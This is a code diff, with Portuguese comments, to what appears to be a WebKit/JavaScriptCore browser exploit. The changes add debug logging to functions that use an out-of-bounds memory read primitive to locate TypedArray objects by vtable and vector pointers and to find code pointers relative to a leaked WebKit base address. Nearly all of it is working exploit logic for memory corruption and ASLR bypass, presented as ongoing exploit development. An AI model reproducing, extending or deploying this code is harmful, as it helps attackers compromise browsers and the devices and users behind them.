@@ -48,7 +48,9 @@ async function scanForTypedArrays(currentCandidateBaseRelOffset, logFn) {
     try {
         const vtableReadOffset = currentCandidateBaseRelOffset + (JSC_OFFSETS.TypedArray.VTABLE_OFFSET || 0);
         vtable_ptr = Core.oob_read_relative(vtableReadOffset, 8);
-        // O log DEBUG_CORE_READ8 em Core.oob_read_relative já dá detalhes sobre o objeto criado
+        // O log de depuração DEBUG_CORE_READ8 em Core.oob_read_relative já nos dá o status da criação.
+        // Podemos adicionar um log aqui para o valor recebido pelo VictimFinder:
+        logFn(`DEBUG_TA_VTABLE_RECEIVED @ ${toHexS1(currentCandidateBaseRelOffset)}: isAdvInt64Obj=${isAdvancedInt64Object(vtable_ptr)}, val=${isAdvancedInt64Object(vtable_ptr) ? vtable_ptr.toString(true) : String(vtable_ptr)}`, 'info', FNAME_BASE);
 
         let vtableMatch = false;
         if (leakedWebKitBaseAddress && KNOWN_TYPED_ARRAY_VTABLE_ABSOLUTE_ADDRESSES.length > 0 && isAdvancedInt64Object(vtable_ptr)) {
@@ -68,7 +70,8 @@ async function scanForTypedArrays(currentCandidateBaseRelOffset, logFn) {
 
         const vectorReadOffset = currentCandidateBaseRelOffset + JSC_OFFSETS.TypedArray.M_VECTOR_OFFSET;
         m_vector_ptr = Core.oob_read_relative(vectorReadOffset, 8);
-
+        logFn(`DEBUG_TA_MVECTOR_RECEIVED @ ${toHexS1(currentCandidateBaseRelOffset)}: isAdvInt64Obj=${isAdvancedInt64Object(m_vector_ptr)}, val=${isAdvancedInt64Object(m_vector_ptr) ? m_vector_ptr.toString(true) : String(m_vector_ptr)}`, 'info', FNAME_BASE);
+        
         const typeName = TYPED_ARRAY_MODES[m_mode_val] || null;
         const isLengthPlausible = typeof m_length_val === 'number' && m_length_val > 0 && m_length_val < (1024 * 1024 * 32);
         
@@ -80,6 +83,7 @@ async function scanForTypedArrays(currentCandidateBaseRelOffset, logFn) {
         if (typeName && isLengthPlausible && isVectorPlausible) {
             const bufferPtrReadOffset = currentCandidateBaseRelOffset + JSC_OFFSETS.TypedArray.ASSOCIATED_ARRAYBUFFER_OFFSET;
             m_buffer_ptr = Core.oob_read_relative(bufferPtrReadOffset, 8);
+            logFn(`DEBUG_TA_MBUFFER_RECEIVED @ ${toHexS1(currentCandidateBaseRelOffset)}: isAdvInt64Obj=${isAdvancedInt64Object(m_buffer_ptr)}, val=${isAdvancedInt64Object(m_buffer_ptr) ? m_buffer_ptr.toString(true) : String(m_buffer_ptr)}`, 'info', FNAME_BASE);
 
             const isBufferPtrPlausible = isAdvancedInt64Object(m_buffer_ptr) &&
                                          !m_buffer_ptr.isNullPtr() &&
@@ -111,8 +115,10 @@ async function scanForCodePointers(currentCandidateBaseRelOffset, logFn) {
     let potentialPtr;
     try {
         potentialPtr = Core.oob_read_relative(currentCandidateBaseRelOffset, 8);
+        logFn(`DEBUG_CP_PTR_RECEIVED @ ${toHexS1(currentCandidateBaseRelOffset)}: isAdvInt64Obj=${isAdvancedInt64Object(potentialPtr)}, val=${isAdvancedInt64Object(potentialPtr) ? potentialPtr.toString(true) : String(potentialPtr)}`, 'info', FNAME_BASE);
 
         if (isAdvancedInt64Object(potentialPtr) && !potentialPtr.isNullPtr() && !potentialPtr.isNegativeOne()) {
+            // ... (lógica de verificação de ponteiro de código como antes)
             if (leakedWebKitBaseAddress) {
                 for (const segment of WEBKIT_LIBRARY_INFO.SEGMENTS) {
                     const segStart = leakedWebKitBaseAddress.add(AdvancedInt64.fromHex(segment.vaddr_start_hex));
